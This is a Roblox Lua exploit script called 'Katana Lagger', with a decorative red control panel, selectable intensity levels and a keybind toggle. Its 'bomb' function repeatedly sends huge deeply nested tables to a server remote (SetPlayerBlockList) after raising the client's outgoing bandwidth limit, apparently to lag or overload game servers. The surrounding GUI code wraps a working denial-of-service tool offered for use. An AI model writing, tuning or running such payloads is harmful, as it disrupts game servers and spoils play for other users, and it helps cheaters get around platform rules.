--// KATANA LAGGER - PANEL ROJO CON ESTRELLAS ROJAS Y BRILLO ROJO
--// Selector de tecla/botón personalizable
--// OPTIMIZADO: Минимальная нагрузка на пинг

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "KatanaLaggerConfig.json"

-- ⚙️ PODER EXACTO: V1 - V2 - V3 - V4
local NIVELES = {
    V1 = { poder = 23, delay = 0.35 },
    V2 = { poder = 32, delay = 0.30 },
    V3 = { poder = 70, delay = 0.22 },
    V4 = { poder = 90, delay = 0.18 }
}

-- 🔑 TECLA PREDETERMINADA: M
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "V1"
local ventanaBloqueada = false
local networkService = nil

-- 🎨 ESTILO - KATANA LAGGER ROJO
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(255, 245, 245),    -- Blanco con tono rojo suave
    TitleColor   = Color3.fromRGB(180, 20, 20),      -- Rojo oscuro
    TextColor    = Color3.fromRGB(150, 40, 40),      -- Rojo medio
    ButtonInact  = Color3.fromRGB(240, 220, 220),    -- Rojo muy claro
    ButtonV1     = Color3.fromRGB(220, 30, 30),      -- Rojo brillante
    ButtonV2     = Color3.fromRGB(200, 50, 50),      -- Rojo medio
    ButtonV3     = Color3.fromRGB(180, 20, 20),      -- Rojo oscuro
    ButtonV4     = Color3.fromRGB(150, 10, 10),      -- Rojo muy oscuro
    ToggleOff    = Color3.fromRGB(220, 200, 200),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(200, 150, 150),
    RedBorder    = Color3.fromRGB(255, 50, 50),      -- Rojo neón para glow
}

-- 💾 CONFIG
local function SaveConfig()
    local data = {
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "V1"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE (оптимизированный, 18 уровней вложенности)
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 18 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() 
        if not networkService then
            networkService = game:GetService("NetworkClient")
        end
        networkService:SetOutgoingKBPSLimit(80000)
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
    end)
end

-- 🧩 ЭЛЕМЕНТЫ МЕНЮ
local toggleBall, toggleContainer, btnV1, btnV2, btnV3, btnV4, lockButton
local titleLabel, keybindButton, toggleClick, statusLabel, keybindLabel
local glowFrame, mainFrame, shadowLabel, shadowGradient, speedLabel

-- Функции обновления
local function actualizarBotonesNivel()
    if nivelActual == "V1" then
        btnV1.BackgroundColor3 = UI_CONFIG.ButtonV1
        btnV1.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnV1.BorderSizePixel = 0
    else
        btnV1.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnV1.TextColor3 = Color3.fromRGB(120, 60, 60)
        btnV1.BorderSizePixel = 2
        btnV1.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    if nivelActual == "V2" then
        btnV2.BackgroundColor3 = UI_CONFIG.ButtonV2
        btnV2.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnV2.BorderSizePixel = 0
    else
        btnV2.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnV2.TextColor3 = Color3.fromRGB(120, 60, 60)
        btnV2.BorderSizePixel = 2
        btnV2.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    if nivelActual == "V3" then
        btnV3.BackgroundColor3 = UI_CONFIG.ButtonV3
        btnV3.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnV3.BorderSizePixel = 0
    else
        btnV3.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnV3.TextColor3 = Color3.fromRGB(120, 60, 60)
        btnV3.BorderSizePixel = 2
        btnV3.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    if nivelActual == "V4" then
        btnV4.BackgroundColor3 = UI_CONFIG.ButtonV4
        btnV4.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnV4.BorderSizePixel = 0
    else
        btnV4.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnV4.TextColor3 = Color3.fromRGB(120, 60, 60)
        btnV4.BorderSizePixel = 2
        btnV4.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- Обновляем информацию о скорости
    local speedText = ""
    if nivelActual == "V1" then
        speedText = "Speed: 45/22"
    elseif nivelActual == "V2" then
        speedText = "Speed: 40-42/18-20"
    elseif nivelActual == "V3" then
        speedText = "Speed: 34-37/15-18"
    elseif nivelActual == "V4" then
        speedText = "CFG Katana - V2 39/19"
    end
    if speedLabel then
        speedLabel.Text = speedText
    end
end

local function actualizarSwitch()
    if toggleBall then
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
            toggleBall.BackgroundColor3 = Color3.fromRGB(220, 30, 30)  -- Rojo cuando está activo
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
            toggleBall.BackgroundColor3 = Color3.fromRGB(200, 180, 180)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ON" or "OFF"
        toggleClick.TextColor3 = laggerActive and Color3.fromRGB(220, 30, 30) or Color3.fromRGB(200, 50, 50)
    end
    if statusLabel then
        statusLabel.Text = laggerActive and "ACTIVE" or "INACTIVE"
        statusLabel.TextColor3 = laggerActive and Color3.fromRGB(220, 30, 30) or Color3.fromRGB(200, 50, 50)
    end
end

local function actualizarCandado()
    if lockButton then
        lockButton.Text = ventanaBloqueada and "LOCK" or "UNLOCK"
    end
end

local function actualizarKeybind()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = display
    end
    if keybindLabel then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindLabel.Text = "KEY: " .. display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    actualizarSwitch()

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            local nivelData = NIVELES[nivelActual]
            while laggerActive do
                bomb(nivelData.poder)
                task.wait(nivelData.delay)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
        pcall(function()
            if not networkService then
                networkService = game:GetService("NetworkClient")
            end
            networkService:SetOutgoingKBPSLimit(0)
        end)
    end
end

-- 🖼️ ИНТЕРФЕЙС
if CoreGui:FindFirstChild("KatanaLagger_UI") then CoreGui.KatanaLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KatanaLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Panel principal (fondo rojo suave)
mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 240, 240)  -- Rojo muy suave
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 0
mainFrame.Size = UDim2.new(0, 240, 0, 150)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -75)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
local mainCorner = Instance.new("UICorner", mainFrame)
mainCorner.CornerRadius = UDim.new(0, 12)

-- ═══════════════════════════════════════════
-- GLOW ROJO
-- ═══════════════════════════════════════════
glowFrame = Instance.new("Frame", mainFrame)
glowFrame.BackgroundColor3 = UI_CONFIG.RedBorder
glowFrame.BackgroundTransparency = 0.65
glowFrame.Size = UDim2.new(1, 16, 1, 16)
glowFrame.Position = UDim2.new(0, -8, 0, -8)
glowFrame.ZIndex = 0
glowFrame.ClipsDescendants = false
local glowCorner = Instance.new("UICorner", glowFrame)
glowCorner.CornerRadius = UDim.new(0, 16)

-- Бордер rojo
local borderStroke = Instance.new("UIStroke", mainFrame)
borderStroke.Color = UI_CONFIG.RedBorder
borderStroke.Thickness = 3
borderStroke.Transparency = 0
borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Анимация свечения rojo
task.spawn(function()
    local direction = -1
    local trans = 0.65
    while true do
        trans = trans + direction * 0.015
        if trans <= 0.4 then
            trans = 0.4
            direction = 1
        elseif trans >= 0.8 then
            trans = 0.8
            direction = -1
        end
        glowFrame.BackgroundTransparency = trans
        task.wait(0.03)
    end
end)

-- Градиент rojo suave
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 240, 240)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 230, 230)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 240, 240))
})
gradient.Rotation = 90

-- ⭐ ESTRELLAS ROJAS
local starFrames = {}
for i = 1, 28 do
    local star = Instance.new("Frame", mainFrame)
    star.BackgroundColor3 = Color3.fromRGB(255, 150, 150)  -- Estrellas rojas
    star.BorderSizePixel = 0
    local size = 1 + math.random() * 2
    star.Size = UDim2.new(0, size, 0, size)
    star.Position = UDim2.new(0, math.random(0, 235), 0, math.random(0, 145))
    star.ZIndex = 1
    star.BackgroundTransparency = 0.1 + math.random() * 0.4
    
    local corner = Instance.new("UICorner", star)
    corner.CornerRadius = UDim.new(1, 0)
    
    table.insert(starFrames, {
        frame = star,
        speedX = (math.random() * 2 - 1) * 0.5,
        speedY = (math.random() * 2 - 1) * 0.5,
        timer = 2 + math.random() * 4,
        elapsed = 0,
        startTrans = star.BackgroundTransparency
    })
end

task.spawn(function()
    while true do
        for _, starData in ipairs(starFrames) do
            local star = starData.frame
            local pos = star.Position
            
            local newX = pos.X.Offset + starData.speedX
            local newY = pos.Y.Offset + starData.speedY
            
            if newX < 0 or newX > 235 then
                starData.speedX = -starData.speedX
                newX = math.clamp(newX, 0, 235)
            end
            if newY < 0 or newY > 145 then
                starData.speedY = -starData.speedY
                newY = math.clamp(newY, 0, 145)
            end
            
            star.Position = UDim2.new(0, newX, 0, newY)
            
            starData.elapsed = starData.elapsed + 0.1
            if starData.elapsed >= starData.timer then
                starData.elapsed = 0
                starData.timer = 1.5 + math.random() * 3
                
                TweenService:Create(star, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 1
                }):Play()
                
                task.wait(0.1)
                
                TweenService:Create(star, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = starData.startTrans
                }):Play()
            end
        end
        task.wait(0.08)
    end
end)

-- ═══════════════════════════════════════════
-- TÍTULO "KATANA LAGGER" EN ROJO
-- ═══════════════════════════════════════════
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 5, 0, 2)
titleLabel.Size = UDim2.new(0, 150, 0, 22)
titleLabel.Font = UI_CONFIG.Font
titleLabel.Text = "KATANA LAGGER"
titleLabel.TextColor3 = Color3.fromRGB(180, 20, 20)  -- Rojo oscuro
titleLabel.TextSize = 16
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3
titleLabel.ClipsDescendants = false

-- Efecto brillo rojo
shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = UDim2.new(0, 5, 0, 2)
shadowLabel.Size = UDim2.new(0, 150, 0, 22)
shadowLabel.Font = UI_CONFIG.Font
shadowLabel.Text = "KATANA LAGGER"
shadowLabel.TextSize = 16
shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
shadowLabel.ZIndex = 4
shadowLabel.ClipsDescendants = true
shadowLabel.TextTransparency = 0
shadowLabel.TextColor3 = Color3.fromRGB(255, 100, 100)  -- Rojo brillante para efecto

shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 50, 50)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 80, 80)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 150, 150)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(255, 80, 80)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(200, 50, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 30, 30))
})
shadowGradient.Rotation = 0

-- Animación del gradiente rojo
task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            shadowGradient.Offset = Vector2.new(i, 0)
            task.wait(0.025)
        end
    end
end)

-- STATUS
statusLabel = Instance.new("TextLabel", mainFrame)
statusLabel.BackgroundTransparency = 1
statusLabel.Position = UDim2.new(1, -65, 0, 2)
statusLabel.Size = UDim2.new(0, 60, 0, 22)
statusLabel.Font = UI_CONFIG.Font
statusLabel.Text = "INACTIVE"
statusLabel.TextColor3 = Color3.fromRGB(200, 50, 50)
statusLabel.TextSize = 10
statusLabel.TextXAlignment = Enum.TextXAlignment.Right
statusLabel.TextYAlignment = Enum.TextYAlignment.Center
statusLabel.ZIndex = 2

-- ═══════════════════════════════════════════
-- TOGGLE SWITCH ROJO
-- ═══════════════════════════════════════════
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = Color3.fromRGB(220, 200, 200)
toggleContainer.Position = UDim2.new(1, -52, 0, 28)
toggleContainer.Size = UDim2.new(0, 44, 0, 20)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = Color3.fromRGB(200, 180, 180)
toggleBall.Size = UDim2.new(0, 18, 0, 18)
toggleBall.Position = UDim2.new(0, 1, 0.5, -9)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 1
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = UI_CONFIG.Font
toggleClick.Text = "OFF"
toggleClick.TextSize = 6
toggleClick.TextColor3 = Color3.fromRGB(200, 50, 50)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false

-- ═══════════════════════════════════════════
-- KEYBIND
-- ═══════════════════════════════════════════
keybindLabel = Instance.new("TextLabel", mainFrame)
keybindLabel.BackgroundTransparency = 1
keybindLabel.Position = UDim2.new(0, 5, 0, 28)
keybindLabel.Size = UDim2.new(0, 60, 0, 20)
keybindLabel.Font = UI_CONFIG.Font
keybindLabel.Text = "KEY: M"
keybindLabel.TextColor3 = Color3.fromRGB(150, 40, 40)
keybindLabel.TextSize = 9
keybindLabel.TextXAlignment = Enum.TextXAlignment.Left
keybindLabel.TextYAlignment = Enum.TextYAlignment.Center
keybindLabel.ZIndex = 2

keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(240, 215, 215)
keybindButton.BackgroundTransparency = 0.3
keybindButton.Position = UDim2.new(0, 50, 0, 28)
keybindButton.Size = UDim2.new(0, 30, 0, 20)
keybindButton.Font = UI_CONFIG.Font
keybindButton.Text = "M"
keybindButton.TextColor3 = Color3.fromRGB(180, 20, 20)
keybindButton.TextSize = 10
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 2
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 4)
actualizarKeybind()

keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "..."
    keybindButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end

    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end

    if newKey then
        keybind = newKey
        actualizarKeybind()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(240, 215, 215)
        keybindButton.BackgroundTransparency = 0.3
        keybindButton.TextColor3 = Color3.fromRGB(180, 20, 20)
    end
end)

-- ═══════════════════════════════════════════
-- LOCK
-- ═══════════════════════════════════════════
lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundColor3 = Color3.fromRGB(240, 215, 215)
lockButton.BackgroundTransparency = 0.3
lockButton.Position = UDim2.new(0, 130, 0, 28)
lockButton.Size = UDim2.new(0, 45, 0, 20)
lockButton.Font = UI_CONFIG.Font
lockButton.Text = "UNLOCK"
lockButton.TextColor3 = Color3.fromRGB(150, 40, 40)
lockButton.TextSize = 8
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 4)
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- ═══════════════════════════════════════════
-- SEPARADOR
-- ═══════════════════════════════════════════
local line1 = Instance.new("Frame", mainFrame)
line1.BackgroundColor3 = Color3.fromRGB(200, 150, 150)
line1.BackgroundTransparency = 0.4
line1.Size = UDim2.new(1, -10, 0, 1)
line1.Position = UDim2.new(0, 5, 0, 52)
line1.ZIndex = 2

-- ═══════════════════════════════════════════
-- BOTONES V1/V2/V3/V4 EN ROJO
-- ═══════════════════════════════════════════
local btnY = 58
local btnWidth = 48
local btnHeight = 38
local espaciado = 6
local totalWidth = btnWidth * 4 + espaciado * 3
local startX = (240 - totalWidth) / 2

btnV1 = Instance.new("TextButton", mainFrame)
btnV1.Size = UDim2.new(0, btnWidth, 0, btnHeight)
btnV1.Position = UDim2.new(0, startX, 0, btnY)
btnV1.Font = UI_CONFIG.Font
btnV1.Text = "V1"
btnV1.TextColor3 = Color3.fromRGB(120, 60, 60)
btnV1.TextSize = 14
btnV1.AutoButtonColor = false
btnV1.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV1.BorderSizePixel = 2
btnV1.BorderColor3 = UI_CONFIG.BorderColor
btnV1.ZIndex = 2
Instance.new("UICorner", btnV1).CornerRadius = UDim.new(0, 6)
btnV1.MouseButton1Click:Connect(function()
    nivelActual = "V1"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnV2 = Instance.new("TextButton", mainFrame)
btnV2.Size = UDim2.new(0, btnWidth, 0, btnHeight)
btnV2.Position = UDim2.new(0, startX + btnWidth + espaciado, 0, btnY)
btnV2.Font = UI_CONFIG.Font
btnV2.Text = "V2"
btnV2.TextColor3 = Color3.fromRGB(120, 60, 60)
btnV2.TextSize = 14
btnV2.AutoButtonColor = false
btnV2.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV2.BorderSizePixel = 2
btnV2.BorderColor3 = UI_CONFIG.BorderColor
btnV2.ZIndex = 2
Instance.new("UICorner", btnV2).CornerRadius = UDim.new(0, 6)
btnV2.MouseButton1Click:Connect(function()
    nivelActual = "V2"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnV3 = Instance.new("TextButton", mainFrame)
btnV3.Size = UDim2.new(0, btnWidth, 0, btnHeight)
btnV3.Position = UDim2.new(0, startX + (btnWidth + espaciado) * 2, 0, btnY)
btnV3.Font = UI_CONFIG.Font
btnV3.Text = "V3"
btnV3.TextColor3 = Color3.fromRGB(120, 60, 60)
btnV3.TextSize = 14
btnV3.AutoButtonColor = false
btnV3.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV3.BorderSizePixel = 2
btnV3.BorderColor3 = UI_CONFIG.BorderColor
btnV3.ZIndex = 2
Instance.new("UICorner", btnV3).CornerRadius = UDim.new(0, 6)
btnV3.MouseButton1Click:Connect(function()
    nivelActual = "V3"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnV4 = Instance.new("TextButton", mainFrame)
btnV4.Size = UDim2.new(0, btnWidth, 0, btnHeight)
btnV4.Position = UDim2.new(0, startX + (btnWidth + espaciado) * 3, 0, btnY)
btnV4.Font = UI_CONFIG.Font
btnV4.Text = "V4"
btnV4.TextColor3 = Color3.fromRGB(120, 60, 60)
btnV4.TextSize = 14
btnV4.AutoButtonColor = false
btnV4.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV4.BorderSizePixel = 2
btnV4.BorderColor3 = UI_CONFIG.BorderColor
btnV4.ZIndex = 2
Instance.new("UICorner", btnV4).CornerRadius = UDim.new(0, 6)
btnV4.MouseButton1Click:Connect(function()
    nivelActual = "V4"
    actualizarBotonesNivel()
    SaveConfig()
end)

-- ═══════════════════════════════════════════
-- SPEED LABEL
-- ═══════════════════════════════════════════
speedLabel = Instance.new("TextLabel", mainFrame)
speedLabel.BackgroundTransparency = 1
speedLabel.Position = UDim2.new(0, 5, 0, 100)
speedLabel.Size = UDim2.new(1, -10, 0, 20)
speedLabel.Font = UI_CONFIG.Font
speedLabel.Text = "Speed: 45/22"
speedLabel.TextColor3 = Color3.fromRGB(150, 50, 50)
speedLabel.TextSize = 9
speedLabel.TextXAlignment = Enum.TextXAlignment.Center
speedLabel.TextYAlignment = Enum.TextYAlignment.Center
speedLabel.ZIndex = 2

-- Aplicar estado inicial
actualizarBotonesNivel()
actualizarSwitch()
actualizarCandado()

-- ═══════════════════════════════════════════
-- HOTKEY
-- ═══════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind and not listeningForInput then
        toggleLagger()
    end
end)

-- ═══════════════════════════════════════════
-- DRAG
-- ═══════════════════════════════════════════
local dragging, dragInput, dragStart, startPos

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        if ventanaBloqueada then return end
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    if dragging and dragInput then
        local delta = dragInput.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- Cerrar conexiones al destruir
screenGui.AncestryChanged:Connect(function()
    if not screenGui.Parent then
        if inputConnection then inputConnection:Disconnect() end
    end
end)
